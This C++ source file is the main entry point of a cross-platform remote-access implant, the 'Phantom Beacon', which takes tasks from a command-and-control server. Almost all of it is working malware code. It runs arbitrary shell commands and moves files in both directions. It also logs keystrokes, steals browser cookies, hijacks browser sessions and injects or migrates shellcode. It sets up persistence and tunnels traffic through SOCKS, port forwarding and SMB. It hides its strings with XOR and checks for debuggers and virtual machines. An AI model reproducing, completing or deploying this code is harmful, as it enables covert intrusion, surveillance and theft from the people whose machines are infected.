// ============================================================================
//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
//  ──────────────────────────────────────────────────────────
//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
//
//  Build (Windows - MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe main.cpp syscalls.o \
//        -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static
//
//  Build (Windows - MSVC):
//    cl /EHsc /O2 /std:c++20 main.cpp syscalls.o /link winhttp.lib bcrypt.lib ws2_32.lib bthprops.lib wlanapi.lib iphlpapi.lib
//
//  Build (Linux / macOS):
//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #ifndef _WIN32_WINNT
    #define _WIN32_WINNT 0x0601
    #endif
    #include <windows.h>
    extern "C" BOOL clear_hw_breakpoints();
    extern "C" void flush_cpu_telemetry();
#else
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <fstream>
    #include <chrono>
    #include <thread>
    #include <cstring>
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <functional>

#include "build_id.h"
#include "c2_config.h"
#include "evasion.h"
#include "crypto.h"
#include "network.h"
#include "recon.h"
#include "portfwd.h"
#include "keylogger.h"
#include "persistence.h"

#include "screenshot.h"
#include "injection.h"
#include "proxy.h"
#include "browser_pivot.h"
#include "netstat.h"
#include "cookie_stealer.h"
#include "cdp_pivot.h"
#ifdef _WIN32
#include "sleep_mask.h"
#include "stack_spoof.h"
#include "smb.h"
#endif
#include "wlan_scan.h"
#include "bt_scan.h"
#include "inmemory.h"

// ── Minimal JSON Parser ────────────────────────────────────────────────────
// We avoid pulling in nlohmann/json to keep the binary tiny.
// This is a purpose-built parser for our specific C2 protocol.

namespace json_mini {

inline std::string get_string(const std::string& json, const std::string& key) {
    std::string key_q = XOR_DEC(XOR_STR("\"")).c_str() + key + XOR_DEC(XOR_STR("\"")).c_str();
    size_t key_pos = json.find(key_q);
    if (key_pos == std::string::npos) return "";

    size_t colon_pos = json.find(':', key_pos + key_q.length());
    if (colon_pos == std::string::npos) return "";

    size_t start_quote = json.find('"', colon_pos);
    if (start_quote == std::string::npos) return "";
    start_quote++;

    size_t end_quote = json.find('"', start_quote);
    if (end_quote == std::string::npos) return "";

    std::string val = json.substr(start_quote, end_quote - start_quote);
    std::string result;
    for (size_t i = 0; i < val.size(); ++i) {
        if (val[i] == '\\' && i + 1 < val.size()) {
            switch (val[i+1]) {
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"':  result += '"';  break;
                default:   result += val[i+1]; break;
            }
            i++;
        } else {
            result += val[i];
        }
    }
    return result;
}

// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
struct Task {
    std::string task_id;
    std::string command;
};

inline std::vector<Task> parse_tasks(const std::string& json) {
    std::vector<Task> tasks;
    // Find the "tasks" key
    size_t key_pos = json.find(XOR_DEC(XOR_STR("\"tasks\"")).c_str());
    if (key_pos == std::string::npos) return tasks;
    
    // Find the start of the array [
    size_t arr_start = json.find('[', key_pos);
    if (arr_start == std::string::npos) return tasks;

    // Find each { ... } object in the array
    size_t pos = arr_start;
    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        size_t obj_end = json.find('}', obj_start);
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Task t;
        t.task_id = get_string(obj, XOR_DEC(XOR_STR("task_id")).c_str());
        t.command = get_string(obj, XOR_DEC(XOR_STR("command")).c_str());
        if (!t.task_id.empty()) tasks.push_back(t);

        pos = obj_end + 1;
    }
    return tasks;
}

}  // namespace json_mini

// ── Shell Execution ────────────────────────────────────────────────────────

// Thread wrapper for asynchronous tasks
#ifdef _WIN32
DWORD WINAPI AsyncThreadWrapper(LPVOID lpParam) {
    auto* func = static_cast<std::function<void()>*>(lpParam);
    (*func)();
    delete func;
    return 0;
}
#endif

std::string run_shell_command(const std::string& cmd) {
    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
    std::string output;

#ifdef _WIN32
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    // Use cmd.exe /c to support built-ins and pipes
    std::string full_cmd = XOR_DEC(XOR_STR("cmd.exe /c ")).c_str() + cmd;
    
    if (CreateProcessA(nullptr, (LPSTR)full_cmd.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(hWrite);
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            output += buffer;
            if (output.size() > 512 * 1024) break;
        }
        WaitForSingleObject(pi.hProcess, 5000); // 5s timeout
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
        CloseHandle(hWrite);
    }
    CloseHandle(hRead);

#else
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) return XOR_DEC(XOR_STR("Error: pipe failed")).c_str();

    pid_t pid = fork();
    if (pid == 0) { // Child
        close(pipe_fd[0]);
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        execl(XOR_DEC(XOR_STR("/bin/sh")).c_str(), XOR_DEC(XOR_STR("sh")).c_str(), XOR_DEC(XOR_STR("-c")).c_str(), cmd.c_str(), (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        close(pipe_fd[1]);
        char buffer[4096];
        ssize_t n;
        while ((n = read(pipe_fd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[n] = '\0';
            output += buffer;
            if (output.size() > 512 * 1024) break;
        }
        close(pipe_fd[0]);
        waitpid(pid, nullptr, 0);
    } else {
        return XOR_DEC(XOR_STR("Error: fork failed")).c_str();
    }
#endif

    if (output.empty()) output = XOR_DEC(XOR_STR("(no output)\n")).c_str();
    return output;
}

// ── Command Dispatcher ─────────────────────────────────────────────────────

std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = net::C2Config()) {
    // Parse command and arguments
    std::istringstream iss(cmd);
    std::string action;
    iss >> action;

    if (action == XOR_DEC(XOR_STR("recon")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        return recon::format_human(path);
    }
    else if (action == XOR_DEC(XOR_STR("ls")).c_str() || action == XOR_DEC(XOR_STR("dir")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) path = ".";
        auto entries = recon::list_directory(path);
        std::string out;
        for (auto& e : entries) {
            out += (e.isDir ? XOR_DEC(XOR_STR("[DIR]  ")).c_str() : XOR_DEC(XOR_STR("[FILE] ")).c_str());
            out += e.name;
            if (!e.isDir) { out += XOR_DEC(XOR_STR("  (")).c_str(); out += recon::i2s(e.size); out += XOR_DEC(XOR_STR(" bytes)")).c_str(); }
            out += XOR_DEC(XOR_STR("\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("drives")).c_str()) {
        auto drives = recon::enumerate_drives();
        std::string out;
        for (auto& d : drives) {
            int totalGB = static_cast<int>(d.totalBytes / (1073741824.0));
            int freeGB  = static_cast<int>(d.freeBytes  / (1073741824.0));
            out += d.letter + XOR_DEC(XOR_STR("  [")).c_str() + d.type + XOR_DEC(XOR_STR("]")).c_str()
                + XOR_DEC(XOR_STR("  Total: ")).c_str() + recon::i2s(totalGB) + XOR_DEC(XOR_STR(" GB")).c_str()
                + XOR_DEC(XOR_STR("  Free: ")).c_str() + recon::i2s(freeGB) + XOR_DEC(XOR_STR(" GB\n")).c_str();
        }
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("whoami")).c_str()) {
#ifdef _WIN32
        char user[256], computer[256];
        DWORD usize = sizeof(user), csize = sizeof(computer);
        GetUserNameA(user, &usize);
        GetComputerNameA(computer, &csize);
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nComputer: ")).c_str() + computer + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char hostname[256] = {0};
        gethostname(hostname, sizeof(hostname));
        const char* user = getenv("USER");
        if (!user) user = XOR_DEC(XOR_STR("unknown")).c_str();
        return std::string(XOR_DEC(XOR_STR("User: ")).c_str()) + user + XOR_DEC(XOR_STR("\nHostname: ")).c_str() + hostname + XOR_DEC(XOR_STR("\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("portfwd")).c_str()) {
        int localPort, remotePort;
        std::string remoteHost;
        if (iss >> localPort >> remoteHost >> remotePort) {
            return portfwd::start_forward(localPort, remoteHost, remotePort);
        }
        return XOR_DEC(XOR_STR("Usage: portfwd <local_port> <remote_host> <remote_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("portfwd-stop")).c_str()) {
        return portfwd::stop_all_forwards();
    }
    else if (action == XOR_DEC(XOR_STR("download")).c_str()) {
        std::string filepath;
        std::getline(iss >> std::ws, filepath);
        if (filepath.empty()) return XOR_DEC(XOR_STR("Usage: download <filepath>")).c_str();

#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
            CloseHandle(hFile);
            return XOR_DEC(XOR_STR("Error: File too large or invalid")).c_str();
        }

        std::vector<BYTE> buffer(fileSize);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        buffer.resize(bytesRead);
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#else
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + filepath;

        file.seekg(0, std::ios::end);
        size_t fileSize = file.tellg();
        if (fileSize > 10 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large")).c_str();
        file.seekg(0, std::ios::beg);

        std::vector<BYTE> buffer(fileSize);
        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
        buffer.resize(file.gcount());
        return XOR_DEC(XOR_STR("FILE_B64:")).c_str() + crypto::base64_encode(buffer);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("upload")).c_str()) {
        std::string filepath, b64data;
        iss >> filepath >> b64data;
        if (filepath.empty() || b64data.empty())
            return XOR_DEC(XOR_STR("Usage: upload <filepath> <base64_data>")).c_str();

        auto data = crypto::base64_decode(b64data);
#ifdef _WIN32
        HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE)
            return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        DWORD bytesWritten;
        WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(bytesWritten) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#else
        std::ofstream file(filepath, std::ios::binary);
        if (!file) return XOR_DEC(XOR_STR("Error: Cannot create file ")).c_str() + filepath;

        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return XOR_DEC(XOR_STR("Uploaded ")).c_str() + recon::i2s(data.size()) + XOR_DEC(XOR_STR(" bytes to ")).c_str() + filepath;
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sysinfo")).c_str()) {
        return recon::get_sysinfo();
    }
    else if (action == XOR_DEC(XOR_STR("netinfo")).c_str()) {
        return recon::get_netinfo();
    }
    else if (action == XOR_DEC(XOR_STR("processes")).c_str()) {
        return recon::get_processes();
    }
    else if (action == XOR_DEC(XOR_STR("find")).c_str()) {
        std::string root, pattern;
        iss >> root >> pattern;
        if (root.empty() || pattern.empty()) return XOR_DEC(XOR_STR("Usage: find <root> <pattern>")).c_str();
        return recon::find_files(root, pattern);
    }
    else if (action == XOR_DEC(XOR_STR("pwd")).c_str()) {
#ifdef _WIN32
        char buf[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buf);
        return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
#else
        char buf[1024];
        if (getcwd(buf, sizeof(buf))) return std::string(buf) + XOR_DEC(XOR_STR("\n")).c_str();
        return XOR_DEC(XOR_STR("Error getting current directory\n")).c_str();
#endif
    }
    else if (action == XOR_DEC(XOR_STR("cd")).c_str() || action == XOR_DEC(XOR_STR("cd..")).c_str()) {
        std::string path;
        if (action == XOR_DEC(XOR_STR("cd..")).c_str()) path = "..";
        else std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cd <path>")).c_str();
        
        // Strip quotes if present
        if (path.size() >= 2 && path.front() == '"' && path.back() == '"') {
            path = path.substr(1, path.size() - 2);
        }

#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#else
        if (chdir(path.c_str()) == 0) return XOR_DEC(XOR_STR("Directory changed to ")).c_str() + path + XOR_DEC(XOR_STR("\n")).c_str();
#endif
        return XOR_DEC(XOR_STR("Error changing directory\n")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("cat")).c_str()) {
        std::string path;
        std::getline(iss >> std::ws, path);
        if (path.empty()) return XOR_DEC(XOR_STR("Usage: cat <file>")).c_str();
        std::ifstream f(path, std::ios::binary);
        if (!f) return XOR_DEC(XOR_STR("Error: Cannot open file ")).c_str() + path;
        
        f.seekg(0, std::ios::end);
        size_t size = f.tellg();
        if (size > 1 * 1024 * 1024) return XOR_DEC(XOR_STR("Error: File too large to cat (max 1MB). Use download.")).c_str();
        f.seekg(0, std::ios::beg);
        
        std::string out;
        char buf[4096];
        while (f.read(buf, sizeof(buf))) out.append(buf, f.gcount());
        out.append(buf, f.gcount());
        return out;
    }
    else if (action == XOR_DEC(XOR_STR("persist")).c_str()) {
        std::string name;
        iss >> name;
        if (name.empty()) name = XOR_DEC(XOR_STR("PhantomBeacon")).c_str();
#ifdef _WIN32
        return persistence::establish_windows(cfg, name);
#else
        return persistence::establish_linux(name);
#endif
    }
    else if (action == XOR_DEC(XOR_STR("sleep")).c_str()) {
        return XOR_DEC(XOR_STR("SLEEP_SET")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("keylog")).c_str()) {
        std::string subCmd;
        iss >> subCmd;
        if (subCmd == XOR_DEC(XOR_STR("start")).c_str()) return keylogger::start();
        if (subCmd == XOR_DEC(XOR_STR("stop")).c_str())  return keylogger::stop();
        if (subCmd == XOR_DEC(XOR_STR("status")).c_str()) return keylogger::status();
        if (subCmd == XOR_DEC(XOR_STR("dump")).c_str()) {
            std::string filter;
            if (iss >> filter)
                return keylogger::dump(filter);
            return keylogger::dump();
        }
        return XOR_DEC(XOR_STR("Usage: keylog <start|stop|status|dump [process]>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
        std::string shell_cmd;
        std::getline(iss >> std::ws, shell_cmd);
        if (shell_cmd.empty()) return XOR_DEC(XOR_STR("Usage: shell <command>")).c_str();
        return run_shell_command(shell_cmd);
    }
    else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
        return "\x01\x02EX";
    }
    else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
#ifdef _WIN32
        DWORD pid;
#else
        pid_t pid;
#endif
        std::string b64code;
        if (iss >> pid >> b64code) {
#ifdef _WIN32
            if (pid == GetCurrentProcessId()) return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
#endif
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::inject_shellcode(pid, code);
            return result;
        }
        return XOR_DEC(XOR_STR("Usage: inject <pid> <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("migrate")).c_str()) {
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            for (auto& b : code) b ^= 0xAA;
            std::string result = injection::migrate_to_new_process(code);
            if (result.find("Migrated successfully") != std::string::npos) {
                return std::string("\x01\x02MG") + result;
            }
            return result;
        }
        return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
#ifdef _WIN32
        std::string b64code;
        if (iss >> b64code) {
            auto code = crypto::base64_decode(b64code);
            if (inmemory::run_shellcode(code)) return XOR_DEC(XOR_STR("Shellcode executed in memory.")).c_str();
            return XOR_DEC(XOR_STR("In-memory execution failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
#else
        std::string b64bin;
        if (iss >> b64bin) {
            auto bin = crypto::base64_decode(b64bin);
            if (inmemory::run_binary(bin)) return XOR_DEC(XOR_STR("Binary executed via memfd.")).c_str();
            return XOR_DEC(XOR_STR("Memfd execution failed.")).c_str();
        }
        return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
#endif
    }
    else if (action == "screenshot") {
        return screenshot::capture();
    }
    else if (action == XOR_DEC(XOR_STR("socks")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            return proxy::start_socks(localPort);
        }
        return XOR_DEC(XOR_STR("Usage: socks <local_port>")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("socks-stop")).c_str()) {
        return proxy::stop_socks();
    }
#ifdef _WIN32
    else if (action == XOR_DEC(XOR_STR("smb-pipe")).c_str()) {
        std::string pipeName;
        std::getline(iss >> std::ws, pipeName);
        return smb::start_smb_pipe(pipeName);
    }
    else if (action == XOR_DEC(XOR_STR("smb-pipe-stop")).c_str()) {
        return smb::stop_smb_pipe();
    }
#endif
    else if (action == XOR_DEC(XOR_STR("browser-pivot")).c_str()) {
        int localPort;
        if (iss >> localPort) {
            unsigned long pid = 0;
            std::string pidStr;
            if (iss >> pidStr) pid = std::stoul(pidStr);
            return browser_pivot::start_pivot(localPort, pid);
        }
        return XOR_DEC(XOR_STR("Usage: browser-pivot <local_port> [pid]")).c_str();
    }
    else if (action == XOR_DEC(XOR_STR("browser-pivot-stop")).c_str()) {
        return browser_pivot::stop_pivot();
    }
    else if (action == XOR_DEC(XOR_STR("browser-list")).c_str()) {
        return browser_pivot::list_browsers();
    }

    else if (action == XOR_DEC(XOR_STR("wlan-scan")).c_str()) {
        return wlan_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("wlan-locate")).c_str()) {
        return wlan_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan")).c_str()) {
        return bt_scan::scan();
    }
    else if (action == XOR_DEC(XOR_STR("bt-scan-json")).c_str()) {
        return bt_scan::scan_json();
    }
    else if (action == XOR_DEC(XOR_STR("netstat")).c_str()) {
        return netstat::format_connections();
    }
    else if (action == XOR_DEC(XOR_STR("netstat-json")).c_str()) {
        return netstat::format_connections_json();
    }
    else if (action == XOR_DEC(XOR_STR("cookies")).c_str()) {
        return cookie_stealer::format_cookies();
    }
    else if (action == XOR_DEC(XOR_STR("cookies-json")).c_str()) {
        return cookie_stealer::format_cookies_json();
    }
    else if (action == XOR_DEC(XOR_STR("cdp-launch")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::launch_and_connect(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-cookies")).c_str()) {
        int port = 9222;
        iss >> port;
        return cdp_pivot::cdp_cookies(port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-eval")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string expr;
        std::getline(iss >> std::ws, expr);
        if (expr.empty()) return "Usage: cdp-eval <expression>";
        return cdp_pivot::cdp_evaluate(expr, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-nav")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-nav <url>";
        return cdp_pivot::cdp_navigate(url, port);
    }
    else if (action == XOR_DEC(XOR_STR("cdp-fetch")).c_str()) {
        int port = 9222;
        iss >> port;
        std::string url;
        std::getline(iss >> std::ws, url);
        if (url.empty()) return "Usage: cdp-fetch <url>";
        return cdp_pivot::cdp_fetch(url, port);
    }
    // Unknown built-in: execute as OS shell command (C2 interact mode)
    return run_shell_command(cmd);
}


// ── Generate Beacon ID ─────────────────────────────────────────────────────

std::string generate_beacon_id() {
#ifdef _WIN32
    char computer[256];
    DWORD csize = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + computer + "-" + hex;
#else
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    char hex[9];
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
    return std::string(XOR_DEC(XOR_STR("LNX-")).c_str()) + hostname + "-" + hex;
#endif
}


// ── Beacon Main Loop ──────────────────────────────────────────────────────

extern "C" void beacon_main(int argc, char** argv) {
#ifndef DISABLE_ANTI
    if (anti::is_debugger_present() || anti::is_vm()) { anti::stalling_delay(50); return; }
#endif

#ifdef _WIN32
    srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
#else
    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
#endif

    net::C2Config cfg;
    cfg.beacon_id = generate_beacon_id();
#ifdef _WIN32
    cfg.host      = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
#else
    cfg.host      = C2_HOST;
#endif
    cfg.port      = C2_PORT;
    cfg.sleep_ms  = 5000;
    cfg.jitter    = 30;

    if (argc >= 2) {
        std::string host_str(argv[1]);
#ifdef _WIN32
        cfg.host = std::wstring(host_str.begin(), host_str.end());
#else
        cfg.host = host_str;
#endif
        if (argc >= 3) cfg.port = std::atoi(argv[2]);
        if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
    }

    bool alive = true;
    auto escape_json = [](const std::string& s) {
        std::string res;
        for (char c : s) {
            if (c == '"') res += "\\\"";
            else if (c == '\\') res += "\\\\";
            else if (c == '\n') res += "\\n";
            else if (c == '\r') res += "\\r";
            else if (c == '\t') res += "\\t";
            else res += c;
        }
        return res;
    };

    while (alive) {
        std::string telemetry = std::string(XOR_DEC(XOR_STR("{\"build_id\":\"")).c_str()) + BUILD_ID +
                    XOR_DEC(XOR_STR("\",\"sysinfo\":\"")).c_str() + escape_json(recon::get_sysinfo()) +
                    XOR_DEC(XOR_STR("\"}")).c_str();

        std::string response = net::checkin(cfg, telemetry);

        if (!response.empty()) {
            auto tasks = json_mini::parse_tasks(response);
            for (auto& task : tasks) {
                std::string output = dispatch_command(task.command, cfg);
                if (output.size() >= 4 && output[0] == '\x01' && output[1] == '\x02') {
                    if (output[2] == 'E' && output[3] == 'X') {
                        alive = false;
                        break;
                    }
                    if (output[2] == 'M' && output[3] == 'G') {
                        output = output.substr(4);
                        net::send_result(cfg, task.task_id, output);
                        alive = false;
                        break;
                    }
                }
                net::send_result(cfg, task.task_id, output);
            }
        }

        int jitter_sleep = cfg.get_sleep_ms();
        while (jitter_sleep > 0) {
            keylogger::poll();
            Sleep(20);
            jitter_sleep -= 20;
        }
    }

#ifdef _WIN32
    net::cleanup();
    WSACleanup();
#endif
}


// ── Entry Point ────────────────────────────────────────────────────────────

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    if (injection::self_hollow())
        return 0;

    int argc = 0;
    char** argv = nullptr;

    std::vector<std::string> args;
    args.push_back("beacon.exe");
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        std::istringstream iss(lpCmdLine);
        std::string token;
        while (iss >> token) args.push_back(token);
    }

    std::vector<char*> argv_ptrs;
    for (auto& a : args) argv_ptrs.push_back(&a[0]);

    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
    return 0;
}
#else
int main(int argc, char** argv) {
    beacon_main(argc, argv);
    return 0;
}
#endif

